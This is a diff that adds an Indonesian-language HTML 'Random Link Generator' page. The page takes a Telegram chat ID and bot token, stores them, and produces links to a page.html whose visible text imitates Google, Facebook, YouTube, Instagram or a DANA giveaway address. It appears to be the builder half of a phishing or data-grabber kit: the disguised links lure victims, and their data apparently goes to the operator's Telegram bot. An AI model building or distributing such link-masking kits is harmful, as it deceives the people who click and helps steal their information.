@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Random Link Generator</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+        }
+        .container {
+            text-align: center;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 0 auto;
+            margin-top: 50px;
+        }
+        .input-container {
+            margin-bottom: 20px;
+        }
+        .input-container input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+        }
+        .link, #generate-button, #copy-button {
+            display: inline-block;
+            color: #fff;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+            cursor: pointer;
+        }
+        .link {
+            background-color: #ff69b4;
+        }
+        .link:hover, #generate-button:hover, #copy-button:hover {
+            background-color: #d3468f;
+        }
+        .loading {
+            display: none;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .loading.active {
+            display: inline-block;
+            animation: spin 1s infinite linear;
+        }
+        #copy-button {
+            background-color: #ff69b4;
+        }
+        #generate-button {
+            background-color: #ff69b4;
+        }
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        @media only screen and (max-width: 500px) {
+            .container {
+                max-width: 90%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Random Link Generator</h1>
+        <p>Masukkan ID Chat dan Token Bot Telegram:</p>
+        <div class="input-container">
+            <input type="text" id="chat-id" placeholder="ID Chat">
+            <input type="text" id="bot-token" placeholder="Token Bot">
+        </div>
+        <button id="generate-button" onclick="generateLink()">Generate</button>
+        <span class="loading" id="loading-icon">&#9201;</span>
+        <a id="random-link" class="link" href="#" target="_blank" style="display:none;">Random link</a>
+        <button id="copy-button" onclick="copyLink()" style="display:none;">Salin</button>
+    </div>
+
+    <script>
+        function generateRandomString(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            const charactersLength = characters.length;
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+            return result;
+        }
+
+        function generateLink() {
+            const randomString = generateRandomString(6);  // Shorter random string
+            const domainList = [
+                'sleepcallin.com', 
+                'google.com',
+                'facebook.com',
+                'mediafire.com',
+                'link.dana.id/kaget?c.',
+                'tiktok.com/zenncindo.',
+                'instagram.com',
+                'youtube.com'
+            ];
+            const randomDomain = domainList[Math.floor(Math.random() * domainList.length)];
+            const randomUrl = randomDomain + randomString;
+
+            const chatId = document.getElementById('chat-id').value;
+            const botToken = document.getElementById('bot-token').value;
+            const linkElement = document.getElementById('random-link');
+            const loadingIcon = document.getElementById('loading-icon');
+
+            loadingIcon.classList.add('active');
+
+            sessionStorage.setItem('chatId', chatId);
+            sessionStorage.setItem('botToken', botToken);
+
+            setTimeout(() => {
+                loadingIcon.classList.remove('active');
+                const generatedLink = `page.html?link=${encodeURIComponent(randomUrl)}`;
+                linkElement.href = generatedLink;
+                linkElement.innerText = randomUrl;
+                linkElement.style.display = 'inline-block';
+                document.getElementById('copy-button').style.display = 'inline-block';
+            }, 2000);
+        }
+
+        function copyLink() {
+            const randomLink = document.getElementById('random-link').href;
+            const tempInput = document.createElement('input');
+            tempInput.value = randomLink;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempInput);
+            alert('Link telah disalin!');
+        }
+    </script>
+</body>
+</html>
